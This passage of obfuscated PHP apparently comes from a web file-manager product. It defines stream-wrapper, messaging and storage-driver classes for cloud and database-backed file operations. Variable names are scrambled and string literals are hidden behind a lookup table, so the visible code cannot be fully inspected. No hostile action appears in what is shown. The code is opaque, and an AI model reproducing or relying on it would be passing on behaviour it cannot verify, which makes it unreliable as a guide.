0, $ÖµùÏÃ’)) . $ÖµùÏÃ’; } $¿Ğ˜àÏ® = intval($ÖµùÏÃ’ / $éò˜öŒ—); $«×­ı¸ş = $ÔÌŞ­Ş[12]; $€ÛÉÉ = timeFloat(); $ç¥©§Œ´ = 15; for ($²¤Â¨• = 0; $²¤Â¨• < $éò˜öŒ—; $²¤Â¨•++) { if (timeFloat() - $€ÛÉÉ > $ç¥©§Œ´) { return !1; } $ø¡ÇòŞ– = $this->fileSubstr($ÑˆôŠàÉ, $¿Ğ˜àÏ® * $²¤Â¨•, $¹ñÎµó); if (!$ø¡ÇòŞ–) { return !1; } $«×­ı¸ş .= $ø¡ÇòŞ–; } $«×­ı¸ş .= $this->fileSubstr($ÑˆôŠàÉ, $ÖµùÏÃ’ - $¹ñÎµó, $¹ñÎµó); return md5($«×­ı¸ş) . $ÖµùÏÃ’; } public function getContent($¿ Âıó’) { return $this->fileSubstr($¿ Âıó’); } public function fileSubstr($ıÒËûÙğ, $²–•÷êœ = 0, $Ó×Ó·€Ğ = -1) { $é†‰äé¨ =& $_SERVER[ˆö¿ÚÌ¼]; $¨±â¸Ü½ = $this->info($ıÒËûÙğ); if (!$¨±â¸Ü½ || !$¨±â¸Ü½[$é†‰äé¨[235]] && $¨±â¸Ü½[$é†‰äé¨[79]] > 1024 * 1024 * 10) { return !1; } if ($Ó×Ó·€Ğ === -1) { $Ó×Ó·€Ğ = $¨±â¸Ü½[$é†‰äé¨[79]]; } if ($Ó×Ó·€Ğ == 0) { return $é†‰äé¨[12]; } $£§·É«å = array($é†‰äé¨[1621] . $²–•÷êœ . $é†‰äé¨[872] . ($²–•÷êœ + $Ó×Ó·€Ğ - 1)); $±„» è« = url_request($ıÒËûÙğ, $é†‰äé¨[1510], !1, $£§·É«å, !1, !1, 30); return $±„» è«[$é†‰äé¨[1301]] ? $±„» è«[$é†‰äé¨[1301]] : $é†‰äé¨[12]; } public function download($’¬Ä±¸É, $ÜíÜ–Ÿã) { Downloader::start($’¬Ä±¸É, $ÜíÜ–Ÿã); return $ÜíÜ–Ÿã; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($¦›ìÃö˜, $‡§Ø‰‚ = '') { $this->info = $this->info($¦›ìÃö˜); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ˆö¿ÚÌ¼][87]]; $this->pathOpen = $¦›ìÃö˜; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$¦›ìÃö˜])) { self::$_chunkBuffer[$¦›ìÃö˜] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($…§Ú­Ã…) { $‹­–…²Í = $this->fileSubstr($this->pose, $…§Ú­Ã…); $this->pose += strlen($‹­–…²Í); return $‹­–…²Í; } public function stream_tell() { return $this->pose; } public function stream_seek($·ì½†Ô, $„Â×½) { $óõŞá±š =& $_SERVER[ˆö¿ÚÌ¼]; if ($„Â×½ == SEEK_SET) { $this->pose = $·ì½†Ô; } else { if ($„Â×½ == SEEK_CUR) { $this->pose += $·ì½†Ô; } else { if ($„Â×½ == SEEK_END) { $this->pose = $this->info[$óõŞá±š[79]] + intval($·ì½†Ô); } } } if ($·ì½†Ô < 0) { $this->pose = $this->info[$óõŞá±š[79]] + $·ì½†Ô; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ˆö¿ÚÌ¼][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($˜òêŠ½, $Ù£ÔµÄ¼) { $¶¿áŞ™ =& $_SERVER[ˆö¿ÚÌ¼]; $ƒÁ äËú = $this->info($˜òêŠ½); return array($¶¿áŞ™[1414] => 0, $¶¿áŞ™[1622] => 0, $¶¿áŞ™[16] => 32768 + 511, $¶¿áŞ™[1623] => 0, $¶¿áŞ™[1624] => 0, $¶¿áŞ™[1625] => 0, $¶¿áŞ™[1626] => 0, $¶¿áŞ™[79] => $ƒÁ äËú[$¶¿áŞ™[79]], $¶¿áŞ™[1627] => $ƒÁ äËú[$¶¿áŞ™[1469]], $¶¿áŞ™[1584] => $ƒÁ äËú[$¶¿áŞ™[88]], $¶¿áŞ™[1583] => $ƒÁ äËú[$¶¿áŞ™[234]], $¶¿áŞ™[1628] => 0, $¶¿áŞ™[1629] => 0); } static $fileInfo = array(); public function info($õóáÑÕ) { $ûË„®¸‘ = $_SERVER[ˆö¿ÚÌ¼][1630]; if (isset(self::$fileInfo[$õóáÑÕ])) { return self::$fileInfo[$õóáÑÕ]; } if (substr($õóáÑÕ, 0, strlen($ûË„®¸‘)) != $ûË„®¸‘) { return !1; } self::$fileInfo[$õóáÑÕ] = IO::info(substr($õóáÑÕ, strlen($ûË„®¸‘))); return self::$fileInfo[$õóáÑÕ]; } public static function read($‘Ë–ìù…, $ĞÖáŞ¸, $ÛÏğ±Ñ…) { if (!isset(self::$_fopenCache[$‘Ë–ìù…])) { $’ûù«¾¬ = new StreamWrapperIO(); $’ûù«¾¬->stream_open($‘Ë–ìù…); self::$_fopenCache[$‘Ë–ìù…] = $’ûù«¾¬; } $’ûù«¾¬ = self::$_fopenCache[$‘Ë–ìù…]; return $’ûù«¾¬->fileSubstr($ĞÖáŞ¸, $ÛÏğ±Ñ…); } public static function _read($°ª¥Ìøò, $ÕòµŠéá, $’šå—È¾) { $­Õ×Æ— =& $_SERVER[ˆö¿ÚÌ¼]; $”íó³â = fopen($°ª¥Ìøò, $­Õ×Æ—[1473]); if (!$”íó³â) { return $­Õ×Æ—[12]; } $­¦Äöù§ = 8192; fseek($”íó³â, $ÕòµŠéá, SEEK_SET); $ÓÁæÄ—ñ = $­Õ×Æ—[12]; $Ä¡ª€İ = 0; while ($Ä¡ª€İ < $’šå—È¾) { $ô×†ãğÅ = min($­¦Äöù§, $’šå—È¾ - $Ä¡ª€İ); $ÓÁæÄ—ñ .= fread($”íó³â, $ô×†ãğÅ); $Ä¡ª€İ += $ô×†ãğÅ; } fclose($”íó³â); return $ÓÁæÄ—ñ; } public function fileSubstr($¬³¢Õ‰, $»õ½£Î±) { $×íñ¥Â =& $_SERVER[ˆö¿ÚÌ¼]; $ªßè£¥Ş = $this->info[$×íñ¥Â[79]]; $âÆÉ£Úü = $¬³¢Õ‰; $Ú”‘ì¦™ = $»õ½£Î±; if ($¬³¢Õ‰ < 0) { $¬³¢Õ‰ = $ªßè£¥Ş + $¬³¢Õ‰; } if ($»õ½£Î± === !1) { $»õ½£Î± = $ªßè£¥Ş - $¬³¢Õ‰; } if ($¬³¢Õ‰ + $»õ½£Î± > $ªßè£¥Ş) { $»õ½£Î± = $ªßè£¥Ş - $¬³¢Õ‰; } if ($»õ½£Î± <= 0) { return $×íñ¥Â[12]; } if ($¬³¢Õ‰ < 0 || $¬³¢Õ‰ >= $ªßè£¥Ş || $»õ½£Î± <= 0 || $»õ½£Î± > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\x69\x6c\145\x52\x65\141\144\x20\145\x72\x72\x6f\x72\x21\x20\163\x74\x61\162\x74\x3d{$¬³¢Õ‰}\73\154\145\156\147\x74\x68\75{$»õ½£Î±}\73\x20\x73\x69\x7a\x65\75{$ªßè£¥Ş}\73"); } $ŸìøÍ¸ = 64 * 1024; $›¬ı‰¨™ =& self::$_chunkBuffer[$this->path]; if (!$›¬ı‰¨™) { $›¬ı‰¨™ = array(); } $“ê¾­¶ì = 0; $½üš•·¯ = 0; $£“©åÁ˜ = $×íñ¥Â[12]; foreach ($›¬ı‰¨™ as $“ê¾­¶ì => $£“©åÁ˜) { $“ê¾­¶ì = intval($“ê¾­¶ì); $½üš•·¯ = $“ê¾­¶ì + strlen($£“©åÁ˜); if ($¬³¢Õ‰ >= $½üš•·¯) { continue; } if ($¬³¢Õ‰ >= $“ê¾­¶ì && $¬³¢Õ‰ + $»õ½£Î± <= $½üš•·¯) { return substr($£“©åÁ˜, $¬³¢Õ‰ - $“ê¾­¶ì, $»õ½£Î±); } break; } if (count($›¬ı‰¨™) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($×íñ¥Â[1631], $×íñ¥Â[1632] . count($›¬ı‰¨™) . "\x3b\163\164\x61\162\164\75{$¬³¢Õ‰}\54\x6c\145\x6e\x67\x74\150\75{$»õ½£Î±}\x3b\x70\x6f\163\145\x3a{$“ê¾­¶ì}\176{$½üš•·¯}"); throw new Exception($×íñ¥Â[1633]); } $ß•¾°²ı = intval($¬³¢Õ‰ / $ŸìøÍ¸) * $ŸìøÍ¸; $Öî“óÖ¯ = ceil(($¬³¢Õ‰ + $»õ½£Î±) / $ŸìøÍ¸) * $ŸìøÍ¸ - $ß•¾°²ı; $¨ó«”óÉ = IO::fileSubstr($this->path, $ß•¾°²ı, $Öî“óÖ¯); $›¬ı‰¨™[$ß•¾°²ı . $×íñ¥Â[12]] = $¨ó«”óÉ; ksort($›¬ı‰¨™); $ˆÒŞÂşğ = substr($¨ó«”óÉ, $¬³¢Õ‰ - $ß•¾°²ı, $»õ½£Î±); return $ˆÒŞÂşğ; } private function log($Çåı‘å, $ùåšÉÎÌ) { $è˜ã¼Æé =& $_SERVER[ˆö¿ÚÌ¼]; $ú÷’Ö¿ö = timeFloat() - $this->timeStart; write_log(sprintf($è˜ã¼Æé[1634], $Çåı‘å, $this->info[$è˜ã¼Æé[32]], $ú÷’Ö¿ö, $ùåšÉÎÌ), $è˜ã¼Æé[1278]); } } class Message { function __construct() { } public function send($åöÁÓ”² = '', $ÊğŸùŠÙ = array(), $ÃŠ¤È¼Ê = "\164\x65\x78\164") { $’™Çã“§ =& $_SERVER[ˆö¿ÚÌ¼]; $§®°ûŒİ = array($’™Çã“§[33] => $’™Çã“§[1227], $’™Çã“§[171] => $åöÁÓ”²); if (in_array($ÃŠ¤È¼Ê, array($’™Çã“§[1227], $’™Çã“§[1635]))) { $§®°ûŒİ[$’™Çã“§[33]] = $ÃŠ¤È¼Ê; } $ÊğŸùŠÙ = array($’™Çã“§[592] => isset($ÊğŸùŠÙ[$’™Çã“§[592]]) ? $ÊğŸùŠÙ[$’™Çã“§[592]] : $’™Çã“§[12], $’™Çã“§[679] => isset($ÊğŸùŠÙ[$’™Çã“§[679]]) ? $ÊğŸùŠÙ[$’™Çã“§[679]] : $’™Çã“§[12]); if (empty($åöÁÓ”²) || empty($ÊğŸùŠÙ[$’™Çã“§[592]]) && empty($ÊğŸùŠÙ[$’™Çã“§[679]])) { return !1; } $‚Õ¦¤šç = array($’™Çã“§[1564] => $§®°ûŒİ, $’™Çã“§[1636] => $ÊğŸùŠÙ); Hook::trigger($’™Çã“§[1637], $‚Õ¦¤šç); } } goto B¿ÚÍ„Ë¾‡; f °ÆìØ­Õ: class PathDriverBOS extends PathDriverS3 { public function __construct($ÛÆù¼Ãş) { parent::__construct($ÛÆù¼Ãş); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($üœœŸåŒ) { $È²±ìû„ =& $_SERVER[ˆö¿ÚÌ¼]; if (substr($üœœŸåŒ, 0, 7) == $È²±ìû„[219]) { $üœœŸåŒ = $È²±ìû„[220] . substr($üœœŸåŒ, 7); } header($È²±ìû„[175] . $üœœŸåŒ); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Ú¼¸¬È) { parent::__construct($Ú¼¸¬È); $this->setSignVersion($_SERVER[ˆö¿ÚÌ¼][250]); } public function uploadFormData($„¢õ¶°, $İ•¯ô¼· = 3600) { $ãÈÔÜÍ =& $_SERVER[ˆö¿ÚÌ¼]; $ì… áæ = $ãÈÔÜÍ[232]; $ˆ×ÆÚÆ = $ãÈÔÜÍ[1426]; $ˆü½åÉØ = $ãÈÔÜÍ[264]; $‡–ÜâÙŠ = gmdate($ãÈÔÜÍ[1427], time() + $İ•¯ô¼·); $Æœê‡»Û = (string) time() . $ãÈÔÜÍ[74] . (string) (time() + $İ•¯ô¼·); $¯·«İ¶ = array($ãÈÔÜÍ[265] => $‡–ÜâÙŠ, $ãÈÔÜÍ[268] => array(array($ãÈÔÜÍ[309] => $ì… áæ), array($ãÈÔÜÍ[269] => $this->bucket), array($ãÈÔÜÍ[270], $ãÈÔÜÍ[271], $ãÈÔÜÍ[12]), array($ãÈÔÜÍ[273] => $ˆü½åÉØ), array($ãÈÔÜÍ[1428] => $ˆ×ÆÚÆ), array($ãÈÔÜÍ[1429] => $this->accessKey), array($ãÈÔÜÍ[1430] => $Æœê‡»Û))); $¯·«İ¶ = json_encode($¯·«İ¶); $åÏÊïœ = hash_hmac($ãÈÔÜÍ[1426], $Æœê‡»Û, $this->secret); $Å¶„ÉŠ÷ = sha1($¯·«İ¶); $Î¿¼æ‚¨ = hash_hmac($ãÈÔÜÍ[1426], $Å¶„ÉŠ÷, $åÏÊïœ); $ÇíÃØ¢ = array($ãÈÔÜÍ[309] => $ì… áæ, $ãÈÔÜÍ[273] => $ˆü½åÉØ, $ãÈÔÜÍ[280] => base64_encode($¯·«İ¶), $ãÈÔÜÍ[1428] => $ˆ×ÆÚÆ, $ãÈÔÜÍ[1429] => $this->accessKey, $ãÈÔÜÍ[1431] => $Æœê‡»Û, $ãÈÔÜÍ[1432] => $Î¿¼æ‚¨, $ãÈÔÜÍ[209] => $this->getHost()); return $ÇíÃØ¢; } public function fileOutImage($¬ßß¨±ü, $°€À¸ü£ = 250) { $ƒ¦ß“È® =& $_SERVER[ˆö¿ÚÌ¼]; if ($this->size($¬ßß¨±ü) > 1024 * 1024 * 32) { return $this->fileOutImageServer($¬ßß¨±ü, $°€À¸ü£); } $‹ÕìÜøç = $this->link($¬ßß¨±ü); $‹ÕìÜøç .= $ƒ¦ß“È®[1433] . $°€À¸ü£ . $ƒ¦ß“È®[1434]; $this->fileOutLink($‹ÕìÜøç); } public function fileOutLink($Ëî—ˆç) { $á¹èÇº¤ =& $_SERVER[ˆö¿ÚÌ¼]; if (substr($Ëî—ˆç, 0, 7) == $á¹èÇº¤[219]) { $Ëî—ˆç = $á¹èÇº¤[220] . substr($Ëî—ˆç, 7); } header($á¹èÇº¤[175] . $Ëî—ˆç); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ñœªÙ³) { $this->pathParse = $ñœªÙ³; $this->model = Model($_SERVER[ˆö¿ÚÌ¼][1435]); } public function getPath($şúîÈ£) { return trim($şúîÈ£, $_SERVER[ˆö¿ÚÌ¼][8]); } public function pathFather($¶×Éğ) { $İ—…Šı = $this->parse($¶×Éğ); $İ—…Šı = $this->infoSimple($¶×Éğ); return $İ—…Šı ? $İ—…Šı[$_SERVER[ˆö¿ÚÌ¼][193]] : !1; } public function pathThis($û‚¸ïûÑ) { $µ³£–ä‰ = $this->infoSimple($û‚¸ïûÑ); return $µ³£–ä‰ ? $µ³£–ä‰[$_SERVER[ˆö¿ÚÌ¼][32]] : !1; } public function getPathOuter($¶ùÛâ¨) { if (!$¶ùÛâ¨) { return $¶ùÛâ¨; } $²‡Ú¨‘ = $this->parse($¶ùÛâ¨); return KodIO::make($²‡Ú¨‘[$_SERVER[ˆö¿ÚÌ¼][478]]); } public function copyFolderFromIO($ÛˆéÔ¡Ğ, $±‡™íë, $°öú„¦, $æäÎ¦—±, $˜­£Øã) { $é‹üä²İ = $this->model->copyFolderFromIO($ÛˆéÔ¡Ğ, $±‡™íë, $°öú„¦, $æäÎ¦—±, $˜­£Øã); return KodIO::make($é‹üä²İ); } public function isParentOf($šŞéÌ«½, $„Ñúş¾) { return $this->model->isParentOf($šŞéÌ«½, $„Ñúş¾); } public function mkfile($Ó½¿¨…¥, $‚ğë˜áé = '', $çóšş = REPEAT_RENAME) { $¢Û›ˆµ =& $_SERVER[ˆö¿ÚÌ¼]; $Ò˜Š®å‘ = $this->parse($Ó½¿¨…¥); $Ó½¿¨…¥ = $Ò˜Š®å‘[$¢Û›ˆµ[478]]; for ($õ£™Éù¾ = 0; $õ£™Éù¾ < count($Ò˜Š®å‘[$¢Û›ˆµ[1436]]); $õ£™Éù¾++) { $æ­ß»Ù© = $Ò˜Š®å‘[$¢Û›ˆµ[1436]][$õ£™Éù¾]; if ($õ£™Éù¾ == count($Ò˜Š®å‘[$¢Û›ˆµ[1436]]) - 1) { $Ó½¿¨…¥ = $this->model->mkfile($Ó½¿¨…¥, $æ­ß»Ù©, $‚ğë˜áé, $çóšş); break; } $Ó½¿¨…¥ = $this->model->mkdir($Ó½¿¨…¥, $æ­ß»Ù©, REPEAT_SKIP); } return $this->getPathOuter($Ó½¿¨…¥); } public function mkdir($áÒÔÔÓ, $‰€úÇà² = REPEAT_SKIP) { $ôØÔ´¿Ò =& $_SERVER[ˆö¿ÚÌ¼]; $½åü£ä¯ = $this->parse($áÒÔÔÓ); $áÒÔÔÓ = $½åü£ä¯[$ôØÔ´¿Ò[478]]; for ($‰Œ´ø÷ó = 0; $‰Œ´ø÷ó < count($½åü£ä¯[$ôØÔ´¿Ò[1436]]); $‰Œ´ø÷ó++) { $€ÉÔ†¬¨ = $½åü£ä¯[$ôØÔ´¿Ò[1436]][$‰Œ´ø÷ó]; $áÒÔÔÓ = $this->model->mkdir($áÒÔÔÓ, $€ÉÔ†¬¨, $‰€úÇà²); } return $this->getPathOuter($áÒÔÔÓ); } public function copyFile($•‰ŞÒ©º, $„ÊŠÖÅÙ, $ó„Å‰úÓ = REPEAT_REPLACE) { $œÛåÆãş =& $_SERVER[ˆö¿ÚÌ¼]; $›«…’šì = $this->parse($„ÊŠÖÅÙ); $†ÍåÁ—· = $this->model->copy($•‰ŞÒ©º, $›«…’šì[$œÛåÆãş[478]], $ó„Å‰úÓ, $›«…’šì[$œÛåÆãş[87]]); return $†ÍåÁ—· ? $this->getPathOuter($†ÍåÁ—·) : !1; } public function moveFile($•—âù©€, $·›áÂÍæ, $ÏıÍ·Š = REPEAT_REPLACE) { $ìâ³ô‘à =& $_SERVER[ˆö¿ÚÌ¼]; $Â¹îÌéâ = $this->parse($·›áÂÍæ); $Ü§¯ÄÖ‹ = $this->model->move($•—âù©€, $Â¹îÌéâ[$ìâ³ô‘à[478]], $ÏıÍ·Š, $Â¹îÌéâ[$ìâ³ô‘à[87]]); return $Ü§¯ÄÖ‹ ? $this->getPathOuter($Ü§¯ÄÖ‹) : !1; } public function copy($úëè¸ú®, $­ä«ãş…, $ÉæãÎ‚è = REPEAT_REPLACE, $—Ç²¦â— = false) { $Ÿ¶òÖØæ = $this->parse($­ä«ãş…); $œ…ãµ›Ø = $this->model->copy($úëè¸ú®, $Ÿ¶òÖØæ[$_SERVER[ˆö¿ÚÌ¼][478]], $ÉæãÎ‚è, $—Ç²¦â—); return $œ…ãµ›Ø ? $this->getPathOuter($œ…ãµ›Ø) : !1; } public function moveSameAllow() { } public function move($Úæâõî­, $›¶ı‘Ã, $¥©Ìøô€ = REPEAT_REPLACE, $á—†ã® = false) { $·¥‚ƒ˜× = $this->parse($›¶ı‘Ã); $©òÈéÆÅ = $this->model->move($Úæâõî­, $·¥‚ƒ˜×[$_SERVER[ˆö¿ÚÌ¼][478]], $¥©Ìøô€, $á—†ã®); return $©òÈéÆÅ ? $this->getPathOuter($©òÈéÆÅ) : !1; } public function remove($¦İ¤‹Ñ°, $ñæ°–© = true) { return $this->model->remove($¦İ¤‹Ñ°, $ñæ°–©); } public function rename($ıéË¹ê, $¸Ç¿Î¾ş) { $Ì³ğî•Á = $this->model->rename($ıéË¹ê, $¸Ç¿Î¾ş); return $Ì³ğî•Á ? $this->getPathOuter($ıéË¹ê) : $Ì³ğî•Á; } public function size($Òƒ€¸úÒ) { $•çˆß›º = $this->infoSimple($Òƒ€¸úÒ); return $•çˆß›º ? $•çˆß›º[$_SERVER[ˆö¿ÚÌ¼][79]] : 0; } public function infoSimple($é¾ë†·ü) { return $this->model->sourceInfo($é¾ë†·ü); } public function info($”¥¥…¡ã) { return $this->infoParse($”¥¥…¡ã); } public function infoAuth($„Ô¡ä½½) { return $this->infoParse($„Ô¡ä½½, !1, !0); } public function infoWithChildren($Ì»»æø) { return $this->infoParse($Ì»»æø, !0); } protected function infoParse($—‘…°‘€, $µñ¹àø¦ = false, $±˜üã˜Ù = false) { if (!$µñ¹àø¦) { return $this->model->pathInfo($—‘…°‘€, $±˜üã˜Ù); } return $this->model->pathInfoMore($—‘…°‘€); } public function infoFullSimple($åë©ğŒ¬) { $öÆ©“Ç =& $_SERVER[ˆö¿ÚÌ¼]; $¯„Ç³–† = explode($öÆ©“Ç[8], $åë©ğŒ¬); $ïÈúã’ = implode($öÆ©“Ç[8], array_splice($¯„Ç³–†, 1)); return $this->model->pathInfoByPath($¯„Ç³–†[0], $ïÈúã’); } public function infoFull($ÌÁàá»–) { $·Ğ×¥Õæ = $this->infoFullSimple($ÌÁàá»–); return is_array($·Ğ×¥Õæ) ? $this->model->pathInfo($·Ğ×¥Õæ[$_SERVER[ˆö¿ÚÌ¼][194]]) : !1; } public function hashSimple($¹”ŞÇÆé) { $øï¶Ã²Œ =& $_SERVER[ˆö¿ÚÌ¼]; $öµ«—àĞ = $this->infoWithChildren($¹”ŞÇÆé); return $öµ«—àĞ[$øï¶Ã²Œ[170]][$øï¶Ã²Œ[689]]; } public function hashMd5($şáúæ˜«) { $Ç€º¼íÜ =& $_SERVER[ˆö¿ÚÌ¼]; $õÄóÏ¤– = $this->infoWithChildren($şáúæ˜«); return $õÄóÏ¤–[$Ç€º¼íÜ[170]][$Ç€º¼íÜ[561]]; } public function exist($ºÏŒË¨×) { $˜óáìÒ… =& $_SERVER[ˆö¿ÚÌ¼]; $®Äó½æÛ = $this->parse($ºÏŒË¨×); if (!$®Äó½æÛ[$˜óáìÒ…[87]]) { return $this->isFile($ºÏŒË¨×) || $this->isFolder($ºÏŒË¨×); } $ò©Ô‹äš = array($˜óáìÒ…[489] => $®Äó½æÛ[$˜óáìÒ…[478]], $˜óáìÒ…[32] => $®Äó½æÛ[$˜óáìÒ…[87]]); $È­ÒÈëÖ = $this->model->where($ò©Ô‹äš)->find(); return $È­ÒÈëÖ ? !0 : !1; } public function isFile($„‚ûğæ×) { $è”Ü•÷ƒ =& $_SERVER[ˆö¿ÚÌ¼]; $‰š¶×ôı = $this->infoSimple($„‚ûğæ×); return $‰š¶×ôı && $‰š¶×ôı[$è”Ü•÷ƒ[497]] == $è”Ü•÷ƒ[231] ? !0 : !1; } public function isFolder($¡°²ß®«) { $´Ò¢è¶ =& $_SERVER[ˆö¿ÚÌ¼]; $ê°ß¾çÂ = $this->infoSimple($¡°²ß®«); return $ê°ß¾çÂ && $ê°ß¾çÂ[$´Ò¢è¶[497]] == $´Ò¢è¶[91] ? !0 : !1; } public function listPath($µĞÍ‹÷â, $—ÅğĞá£ = false) { $‡¹à…¸¢ =& $_SERVER[ˆö¿ÚÌ¼]; if ($µĞÍ‹÷â == $‡¹à…¸¢[12]) { return !1; } $‡—û¹ä = array($‡¹à…¸¢[489] => $µĞÍ‹÷â); if ($—ÅğĞá£) { return $this->model->listSource($‡—û¹ä, -1); } return $this->model->listSource($‡—û¹ä); } public function has($»ÔëØñÖ, $Ñ–³úí¢ = false, $úâûæ = null) { $¦¶”å =& $_SERVER[ˆö¿ÚÌ¼]; $Ø¡ÇŞ›Ç = $this->infoWithChildren($»ÔëØñÖ); if ($Ñ–³úí¢) { return array($¦¶”å[243] => $Ø¡ÇŞ›Ç[$¦¶”å[243]], $¦¶”å[242] => $Ø¡ÇŞ›Ç[$¦¶”å[242]]); } return $úâûæ ? $Ø¡ÇŞ›Ç[$¦¶”å[243]] : $Ø¡ÇŞ›Ç[$¦¶”å[242]]; } public function listAll($çªŸü¾Ğ) { $¢Ò‚™Àš = IO::info($this->pathParse[$_SERVER[ˆö¿ÚÌ¼][87]]); if (!$¢Ò‚™Àš) { return array(); } return $this->model->listAll($çªŸü¾Ğ); } public function getContent($úëª×Ğå) { return $this->model->getContent($úëª×Ğå); } public function setContent($ôº™Ç³ı, $Ú½Õ = '') { return $this->model->setContent($ôº™Ç³ı, $Ú½Õ); } public function fileSubstr($•›Œ°¶, $Šª¨Ÿ‡â, $àÙãòæé) { return $this->model->fileSubstr($•›Œ°¶, $Šª¨Ÿ‡â, $àÙãòæé); } public function download($à€´›î†, $È¬¶ÑÕÌ = '') { $©Ó¸µö‰ = get_path_father($È¬¶ÑÕÌ); $ê‰áÉøÕ = get_path_this($È¬¶ÑÕÌ); $§ƒûùƒ = $this->model->fileInfoGet($à€´›î†); $ÈŒÉ™¹¨ = IO::copy($§ƒûùƒ[$_SERVER[ˆö¿ÚÌ¼][87]], $©Ó¸µö‰, !1, $ê‰áÉøÕ); return $ÈŒÉ™¹¨; } public function setModifyTime($ÊÛÒ’, $öóœåğº = '') { $‚˜ŸÑíü =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ÊÛÒ’) { return; } $this->model->where(array($‚˜ŸÑíü[503] => $ÊÛÒ’))->save(array($‚˜ŸÑíü[88] => $öóœåğº)); } public function upload($ƒË¨¦ï„, $¦òÂ®üÅ, $áÖô§è = false, $¯¹Ğ£´à = REPEAT_REPLACE) { $ª„î÷éê =& $_SERVER[ˆö¿ÚÌ¼]; $ğ½ªãÇ = $this->parse($ƒË¨¦ï„); $Ÿ®”äÀ¤ = $this->model->addFile($ğ½ªãÇ[$ª„î÷éê[478]], $¦òÂ®üÅ, $ğ½ªãÇ[$ª„î÷éê[87]], $áÖô§è, $¯¹Ğ£´à); return $this->getPathOuter($Ÿ®”äÀ¤); } public function uploadFileByID($¯‘ùÑÑ, $ùÅÁˆÁÊ, $¸ĞƒÔš½) { $Æ„²¢Œ =& $_SERVER[ˆö¿ÚÌ¼]; $‡áƒÆ¡ = $this->parse($¯‘ùÑÑ); $˜†…ğë = $this->model->addFileByFileID($‡áƒÆ¡[$Æ„²¢Œ[478]], $ùÅÁˆÁÊ, $‡áƒÆ¡[$Æ„²¢Œ[87]], $¸ĞƒÔš½); return $this->getPathOuter($˜†…ğë); } public function addFileByRemote($¥°ß”¸, $’ÍÄİö¤, $øÒ¹Íı¦ = array(), $Ó½ÇÈ©è = '', $¥âä©æ) { $¦Úè»Æã =& $_SERVER[ˆö¿ÚÌ¼]; $ôçôïŞá = $this->parse($¥°ß”¸); $Ó½ÇÈ©è = empty($Ó½ÇÈ©è) ? $ôçôïŞá[$¦Úè»Æã[87]] : $Ó½ÇÈ©è; $øîŸ®¸µ = $this->model->addFileByRemote($ôçôïŞá[$¦Úè»Æã[478]], $’ÍÄİö¤, $Ó½ÇÈ©è, $øÒ¹Íı¦, $¥âä©æ); return $this->getPathOuter($øîŸ®¸µ); } public function uploadLink($Ë ô·û, $ÄÁ·îÉÇ = 0) { $øÂ¤øƒó =& $_SERVER[ˆö¿ÚÌ¼]; $ËÕ‰˜«İ = $this->parse($Ë ô·û); $äÓü’µñ = _get($GLOBALS[$øÂ¤øƒó[7]], $øÂ¤øƒó[1437]); $ï¸À³œÜ = _get($GLOBALS[$øÂ¤øƒó[7]], $øÂ¤øƒó[1438]); $Ë ô·û = Model($øÂ¤øƒó[691])->createFileName($ËÕ‰˜«İ[$øÂ¤øƒó[87]], $äÓü’µñ, $ï¸À³œÜ); return IO::uploadLink($Ë ô·û, $ÄÁ·îÉÇ); } public function fileNameAuto($ñá©”ú£, $óÊéÈ¼Ş, $ÌŒ‰…Ö = REPEAT_REPLACE, $·‘ß€£ = false) { return $this->model->fileNameAuto($ñá©”ú£, $óÊéÈ¼Ş, $ÌŒ‰…Ö, $·‘ß€£); } public function fileNameExist($êº–‹Øü, $¡¾¾Á¯À) { return $this->model->fileNameExist($êº–‹Øü, $¡¾¾Á¯À); } protected function _fileOut($ıû» ·¡, $ÜƒÔ©ö¯ = false, $¿ÂŸ×Âí = false, $ĞáÈñ— = '', $§èÆÏ¡Ö = false) { $·¸§òÍª =& $_SERVER[ˆö¿ÚÌ¼]; $ïÓÄÃ¹ê = $this->model->sourceInfo($ıû» ·¡); if ($ïÓÄÃ¹ê[$·¸§òÍª[497]] == $·¸§òÍª[91]) { header($·¸§òÍª[1439]); die; } $¶ßÔ²ÔÈ = $this->model->fileInfoGet($ıû» ·¡); $ĞáÈñ— = $¶ßÔ²ÔÈ[$·¸§òÍª[561]] ? $¶ßÔ²ÔÈ[$·¸§òÍª[561]] : $ĞáÈñ—; $²ˆ˜Æõ´ = isset($GLOBALS[$·¸§òÍª[183]]) && is_array($GLOBALS[$·¸§òÍª[183]]) ? $GLOBALS[$·¸§òÍª[183]][$·¸§òÍª[32]] : $ïÓÄÃ¹ê[$·¸§òÍª[32]]; if ($§èÆÏ¡Ö) { return IO::fileOutServer($¶ßÔ²ÔÈ[$·¸§òÍª[87]], $ÜƒÔ©ö¯, $²ˆ˜Æõ´, $ĞáÈñ—); } IO::fileOut($¶ßÔ²ÔÈ[$·¸§òÍª[87]], $ÜƒÔ©ö¯, $²ˆ˜Æõ´, $ĞáÈñ—); } public function fileOut($°Û€Â”ú, $Ã–Ã¿á¸ = false, $íı°¦ûƒ = false, $Šö÷“‰ = '') { $this->_fileOut($°Û€Â”ú, $Ã–Ã¿á¸, $íı°¦ûƒ, $Šö÷“‰); } public function fileOutServer($Ø”–»Ó, $ÂûâÔ‘” = false, $™ƒşïÎï = false, $÷í²¾ú× = '') { $this->_fileOut($Ø”–»Ó, $ÂûâÔ‘”, $™ƒşïÎï, $÷í²¾ú×, !0); } protected function _fileOutImage($÷¢‡©­Ì, $œé±üÄı = 250) { $°„Ô†ß =& $_SERVER[ˆö¿ÚÌ¼]; $©‡ÀŒ¶… = $this->model->pathInfo($÷¢‡©­Ì); if 